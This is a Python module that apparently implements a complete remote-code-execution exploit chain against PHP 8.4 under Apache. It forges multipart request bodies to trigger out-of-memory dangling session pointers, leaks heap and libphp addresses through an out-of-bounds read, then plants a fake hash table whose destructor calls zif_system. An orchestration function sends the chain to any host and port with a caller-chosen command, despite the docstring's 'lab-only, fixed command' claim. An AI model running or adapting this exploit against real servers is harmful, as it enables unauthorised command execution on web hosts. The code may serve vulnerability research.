"""Un-instrumented core chain (9bie ladder, reimplemented for this repo's labs).

Target: stock `php:8.4.26-apache` (mod_php), official `php.ini-production`,
official prefork, `files` session handler. No debugger, no `[UAFDBG]`
oracle, no docker-log oracle — the two addresses the fire stage needs are
read in-band from the leak.

Chain (all plain HTTP, chunked where the body exceeds post_max_size):

  A1  END-cleanup send_cookie OOM          -> dangling PS(id)
  B1  stale-id OOB read                    -> chunk base + libphp base
  A2  cheap OOM                            -> dangling PS(http_session_vars)
  B2  fake reference + fake zend_array     -> pDestructor = zif_system

Body shapes, offsets and the leak parser are the published 9bie parameters
(`LEAK_SPEC`, `fake_len = 0xC8000`, `MAIN_BUCKET_COUNT = 87`, x86_64
`zval_ptr_dtor = 0x65EB60` / `zif_system = 0x465370`), validated against
the exact `libphp.so` SHA-256 `51663cf883b1…`. The reimplementation keeps
this repo's guardrails: local lab hosts only, fixed benign command
(`id | uname | whoami` redirected to `/out/p1`).

Scope: lab-only research. No remote target packaging, no arbitrary command.
"""

from __future__ import annotations

import struct
import time
import urllib.parse
from collections import Counter

from . import amplify, pinning, probe, profiles as profilelib

BOUNDARY = b"C" * 10
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# Backward-compatible aliases; the authoritative values live in `profiles`.
LEAK_SPEC = profilelib.DEFAULT_GEOMETRY["leak_spec"]
FAKE_LEN = profilelib.DEFAULT_GEOMETRY["fake_len"]
MAIN_BUCKET_COUNT = profilelib.DEFAULT_GEOMETRY["main_bucket_count"]
S_OFF = profilelib.DEFAULT_GEOMETRY["s_off"]

# Arch defaults, now sourced from the profile registry. Kept as `PROFILES`
# for the existing callers/tests.
PROFILES = {
    arch: profilelib.runtime(profilelib.for_arch(arch))
    for arch in profilelib.ARCH_DEFAULTS
}

# --------------------------------------------------------------------------
# A1 — END-cleanup send_cookie OOM (mk_a1.py)
# --------------------------------------------------------------------------
def a1_body(parts=860, depth=64, key_pad=90, fillers128=14, big=78,
            big_len=8000, burners=20, burner_len=4000, progress_len=4000,
            sid=b"\x00"):
    out = bytearray()

    def nest(i):
        return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)

    def part(name, value=b"", filename=None, ctype=None):
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    for i in range(parts):
        ctype = (b"C" * 103 if i == 0 else b"C" * 231 if i == 1
                 else b"application/octet-stream")
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   nest(i) + b"\"")
        out.extend(b"; filename=\"A\"" if i < 2 else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(fillers128):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# --------------------------------------------------------------------------
# B1 — stale-id OOB read (mk_leak_b.py)
# --------------------------------------------------------------------------
def _tag8(idx, tagged):
    return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB" if tagged else b"BBBB/BBB"


def _value_pages(pages, fill):
    return fill * (pages * 4096 - 25)


def _forge_fill(pages, page, fake_len, idx=0, tagged=False):
    """Full-chunk fill with a fake zend_string header at chunk + page*0x1000."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _forge_value(page, fake_len, idx=0, tagged=False):
    hdr = page * 0x1000 - 0x1018
    L = hdr + 0x18 + 8
    v = bytearray(b"A" * L)
    struct.pack_into("<I", v, hdr + 0x00, 0)
    struct.pack_into("<I", v, hdr + 0x04, 0x16)
    struct.pack_into("<Q", v, hdr + 0x08, 0)
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)
    v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)[:8]
    return bytes(v)


def _forge_at(pages, off, fake_len, idx=0, tagged=True):
    """Full-chunk fill with a fake zend_string header at an absolute byte
    offset inside the value (calibration: the stale slot is not always on a
    page boundary; `H:pages:off` names the exact offset)."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    if 0 <= off and off + 0x18 + 8 <= L:
        struct.pack_into("<I", v, off + 0x00, 0)
        struct.pack_into("<I", v, off + 0x04, 0x16)
        struct.pack_into("<Q", v, off + 0x08, 0)
        struct.pack_into("<Q", v, off + 0x10, fake_len)
        v[off + 0x18:off + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _forge_spray(pages, step, fake_len, idx=0, tagged=True):
    """Fill with forged zend_string headers every `step` bytes.

    For a build whose stale slot is not page-aligned (or not deterministic),
    a dense spray covers the whole window instead of one guessed offset.
    """
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    step = max(0x20, step)
    for off in range(0, L - 0x20, step):
        struct.pack_into("<I", v, off + 0x00, 0)
        struct.pack_into("<I", v, off + 0x04, 0x16)
        struct.pack_into("<Q", v, off + 0x08, 0)
        struct.pack_into("<Q", v, off + 0x10, fake_len)
        v[off + 0x18:off + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _progress_forge(page, fake_len):
    D = page * 0x1000 - 0x1018
    voff = D - 16
    v = bytearray(b"K" * (voff + 0x18 + 8))
    struct.pack_into("<I", v, voff + 0x00, 0)
    struct.pack_into("<I", v, voff + 0x04, 0x16)
    struct.pack_into("<Q", v, voff + 0x08, 0)
    struct.pack_into("<Q", v, voff + 0x10, fake_len)
    v[voff + 0x18:voff + 0x18 + 8] = b"/99BBBBB"
    return bytes(v)


def b1_body(spec=LEAK_SPEC, sid=b"a", progress=b"k0", name_len=120,
            fake_len=FAKE_LEN, tagged=True):
    out = bytearray()

    def part(name, value):
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    has_p = any(it.partition(":")[0] == "P" for it in spec.replace(",", " ").split())
    if not has_p:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            v = _value_pages(int(arg, 0), b"A" if kind == "F" else b"S")
        elif kind == "A":
            v = _forge_value(int(arg, 0), fake_len, idx, tagged)
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill(int(pages_s, 0), int(page_s, 0), fake_len, idx, tagged)
        elif kind == "H":
            pages_s, _, off_s = arg.partition(":")
            v = _forge_at(int(pages_s, 0), int(off_s, 0), fake_len, idx, tagged)
        elif kind == "D":
            pages_s, _, step_s = arg.partition(":")
            v = _forge_spray(int(pages_s, 0), int(step_s, 0), fake_len, idx,
                             tagged)
        elif kind == "P":
            part(b"PHP_SESSION_UPLOAD_PROGRESS", _progress_forge(int(arg, 0), fake_len))
            idx += 1
            continue
        elif kind == "X":
            for _ in range(int(arg, 0)):
                part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise ValueError(f"bad spec item {item!r}")
        part(("f%04d" % idx).encode().ljust(name_len, b"f")[:name_len], v)
        idx += 1
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# --------------------------------------------------------------------------
# A2 — cheap OOM (cheap_oom_a.py, parts 880 / depth 64 / fillers 115)
# --------------------------------------------------------------------------
def a2_body(parts=880, depth=64, fillers=115, sid=b"a" * 32, progress=b"k0"):
    out = bytearray()

    def part(name, value=b""):
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        name = ("files[R%05d]" % i).encode() + b"[a]" * (depth - 2)
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"")
        out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: application/octet-stream\r\n\r\n")
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# --------------------------------------------------------------------------
# B2 — fake reference + fake zend_array (mk_ht.py + fake_ref_b.py)
# --------------------------------------------------------------------------
def ht_body(htdata, zif, cmd, size=384):
    ht = bytearray(b"\x00" * size)
    # fake zend_array at S
    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)      # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                # pDestructor = zif_system
    # fake execute_data at E = S+0x20
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)            # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)  # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 IS_STRING
    # fake zend_string at S+0x80
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    if len(cmd) > 0x160 - 0x98:
        raise ValueError("command too long for the 384-byte carrier")
    return bytes(ht)


def _fake_ref(ptr, rc, val_type):
    rv = bytearray(32)
    struct.pack_into("<I", rv, 0, rc)
    rv[4] = 0x0A
    struct.pack_into("<Q", rv, 8, ptr)
    struct.pack_into("<I", rv, 16, val_type)
    return bytes(rv)


def _make_spray(vl, ptr, rc, val_type, ref_start=8, ref_step=32):
    v = bytearray(b"S" * vl)
    o = ref_start
    while o + 32 <= vl:
        v[o:o + 32] = _fake_ref(ptr, rc, val_type)
        o += ref_step
    return bytes(v)


def b2_body(htdata, cmd, htblob, vl=384, n1=500, n2=495, rc=1,
            name_len=10, val_type=0x0107, sid=b"a" * 32, progress=b"k0"):
    def make_name(prefix, i, nlen):
        return (prefix + ("%09d" % i).encode() + b"x" * nlen)[:nlen]

    def part(name, value):
        return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    spray = _make_spray(vl, htdata, rc, val_type)
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, name_len), spray)
    body += part(b"ht", htblob)
    body += part(b"PHPSESSID", sid)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(n2):
        body += part(make_name(b"t", i, name_len), spray)
    body += b"--" + BOUNDARY + b"--\r\n"
    return bytes(body)


# --------------------------------------------------------------------------
# Leak parse (exploit.py parse_leak)
# --------------------------------------------------------------------------
def parse_leak(resp, profile=None):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError(f"no Set-Cookie in leak response ({len(resp)} bytes)")
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))

    ptr_max = profile["ptr_max"] if profile is not None else 0xFFFFFFFFFFFF
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= ptr_max:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")
    zdtor, _n = counts.most_common(1)[0]
    if profile is None:
        profile = PROFILES["aarch64" if zdtor > 0x7FFFFFFFFFFF else "x86_64"]
        if profile["ptr_max"] != 0xFFFFFFFFFFFF:
            counts = Counter({q: c for q, c in counts.items()
                              if q <= profile["ptr_max"]})
    # Pick the destructor-offset candidate that lands the libphp base on a
    # page (prefer 64 KiB) boundary; builds differ by a small leak bias.
    candidates = profile.get("dtor_offsets") or [profile["dtor_offset"]]
    chosen = None
    for off in candidates:
        base = zdtor - off
        if base & 0xFFF:
            continue
        score = 2 if base & 0xFFFF == 0 else 1
        if chosen is None or score > chosen[0]:
            chosen = (score, off, base)
    if chosen is not None:
        lib = chosen[2]
        profile = dict(profile, dtor_offset=chosen[1])
    else:
        lib = zdtor - profile["dtor_offset"]

    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    want = profile.get("main_bucket_count", MAIN_BUCKET_COUNT)
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - want), bc[1]))
    return {
        "decoded": len(dec),
        "profile": profile,
        "zdtor": zdtor,
        "lib": lib,
        "counts": counts,
        "buckets": buckets,
        "main_candidates": [b for b, _ in cands[:3]],
    }


# --------------------------------------------------------------------------
# Orchestration
# --------------------------------------------------------------------------
def run_chain(host, port, workers=150, cmd="id", path="/index.php",
              proof_host=None, retries=3, arch=None, bias_zif=0, build=None,
              report=print):
    """Run the full chain and return a result dict.

    `proof_host` is the host-side path of the container's `/out/p1`.
    `bias_zif` shifts the dispatched zif_system address to prove the leaked
    address is load-bearing (a non-zero bias must fail).
    `build` is an optional PHP version (e.g. "8.4.26"): when given, the
    offsets and heap geometry come from the per-build profile registry.
    """
    if build:
        found = profilelib.find(php_version=build,
                                arch=None if arch in (None, "auto") else arch)
        if found is None:
            raise KeyError(f"no profile for build {build!r} arch {arch!r}")
        profile = profilelib.runtime(found)
    else:
        profile = None if arch is None or arch == "auto" else PROFILES[arch]
    leak_spec = (profile or {}).get("leak_spec", LEAK_SPEC)
    proof = proof_host
    for attempt in range(1, retries + 1):
        report(f"[try {attempt}] A1: END-cleanup send_cookie OOM")
        with pinning.WorkerPinner(host, port, holders=workers - 1,
                                  settle=0.8):
            # prime the pinned worker
            try:
                probe.http_get(host, port, path, timeout=5, recv_timeout=5)
            except OSError:
                pass

            amplify.send_chunked(host, port, path + Q, a1_body(),
                                 "multipart/form-data", boundary="C" * 10,
                                 timeout=180)
            time.sleep(0.2)

            report(f"[try {attempt}] B1: stale-id OOB read (chunk + libphp)")
            leak_resp = amplify.send_chunked(host, port, path, b1_body(spec=leak_spec),
                                             "multipart/form-data",
                                             boundary="C" * 10,
                                             timeout=600)
            try:
                info = parse_leak(leak_resp, profile)
            except RuntimeError as exc:
                report(f"      leak failed: {exc}")
                continue
            report(f"      decoded={info['decoded']} "
                   f"zdtor={info['zdtor']:#x} lib={info['lib']:#x}")
            profile = info["profile"]
            s_off = profile.get("s_off", S_OFF)
            zif = info["lib"] + profile["zif_offset"] + bias_zif
            for cand in info["main_candidates"]:
                delta = info["lib"] - cand
                if not (profile["delta_min"] <= delta <= profile["delta_max"]):
                    continue
                S = cand + s_off
                report(f"      A2+B2: main={cand:#x} S={S:#x} zif={zif:#x}")

                probe.http_post(
                    host, port, path, a2_body(),
                    headers={"Content-Type": "multipart/form-data; boundary=CCCCCCCCCC"},
                    timeout=120, recv_timeout=120,
                )
                time.sleep(0.2)

                ht = ht_body(S, zif, cmd.encode())
                body = b2_body(S, cmd, ht)
                probe.http_post(
                    host, port, path, body,
                    headers={"Content-Type": "multipart/form-data; boundary=CCCCCCCCCC"},
                    timeout=120, recv_timeout=120,
                )
                time.sleep(0.6)

                out = _read_proof(proof)
                if out is not None and out.strip():
                    return {"rce": True, "output": out.decode("latin-1", "strip"),
                            "lib": info["lib"], "main": cand, "zif": zif,
                            "decoded": info["decoded"]}
                report("      candidate failed (no proof)")
    return {"rce": False}


def _read_proof(proof_host):
    if proof_host is None:
        return None
    try:
        with open(proof_host, "rb") as fh:
            return fh.read()
    except OSError:
        return None